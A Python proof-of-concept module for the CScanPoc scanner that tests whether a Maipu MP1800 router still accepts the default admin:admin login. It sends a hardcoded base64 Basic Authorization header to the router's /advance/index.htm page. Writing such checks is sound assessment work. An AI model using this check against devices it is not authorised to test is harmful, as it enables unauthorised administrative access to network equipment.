# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'MPsec_0003'  # 平台漏洞编号，留空
    name = 'MP1800多业务路由器及信息通信网关 默认密码'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.OTHER  # 漏洞类型
    disclosure_date = '2015-07-24'  # 漏洞公布时间
    desc = '''
        MP1800是迈普公司自主研发的新一代多业务路由器及信息通信网关，它融合了路由技术、交换技术、安全技术、统一通信、存储、视频、3G、WLAN、流量控制、上网行为监管等，是迈普公司打造多业务边缘智能网MeIN（Multi-service Edge-Intelligent Network）的高性能全功能边缘网络设备。
        MP1800采用固定配置和模块化相结合的结构，在固定配置满足电缆、光纤宽带接入的同时，还可通过模块扩展提供3G、xDSL、V24/V35、E1/CE1、ISDN等各种宽窄带接入能力，并提供各种接入组合的负载均衡机制。MP1800具有极强的应用扩展能力，通过松耦合架构的开放通信计算机技术，
        进一步提供统一通信服务器、存储、视频、短信平台等多种应用，并提供开放接口为企业提供高度融合的信息化解决方案，能够在企业应用不断丰富的情况下将多元业务方便地部署于一个网络节点，不仅能够最大程度的减少网络中设备多而导致的纷繁复杂的问题，还可降低企业信息化投资与运维成本。

        主要具有以下特点：
        路由、交换一体化，支持2个以太网WAN口 ＋ 4 / 8个以太网LAN口 宽带、窄带一体化，支持从N*64K—100M广域网链路接口 广域、局域一体化，软件功能全面支持广域网和局域网的统一控制和管理 有线、无线一体化，支持3G和WLAN接入，能够和有线网络进行无缝对接 数据、语音一体化，支持数据多业务的开展和VOIP功能，
        并能进一步扩展为IPPBX 信息、通信一体化，支持丰富的增值应用、网络应用监管和扩展开放通信计算机能力
        MP1800 版本信息系统ID : ***********硬件模型 : RM1800-31 with 256 MBytes SDRAM, 32 MBytes flash 版本信息 : 004(Hotswap Unsupported)版本信息 : 003 Monitor的版本信息 : 1.27IOS版本 : 6.2.44(integrity) IOS文件名 : flash0: /flash/rp10-i-6.2.44.pckIOS编译时间 : 2011年12月23日, 00:48:30 WEB系统版本 : 1.1 (build 260) WEB系统编译时间 : 2011年12月23日 9:21:43 

        MP1800多业务路由器及信息通信网关默认口令。
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '迈普'  # 漏洞应用名称
    product_version = 'MP1800多业务路由器及信息通信网关'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '54a461f3-98f4-4d0c-9251-ccc3a522b655'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-25'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }
                    
    def verify(self):
        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # refer     :  http://www.wooyun.org/bugs/wooyun-2015-0129025
            hh = hackhttp.hackhttp()
            arg = self.target
            payload = "/advance/index.htm"
            url = arg + payload
            header = "Authorization: Basic YWRtaW46YWRtaW4="
            code, head, res, errcode, _ = hh.http(url, header=header)

            if code == 200 and 'RES_BUTTON_EXIT' in res:
                #security_hole(url + "  admin:admin")
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
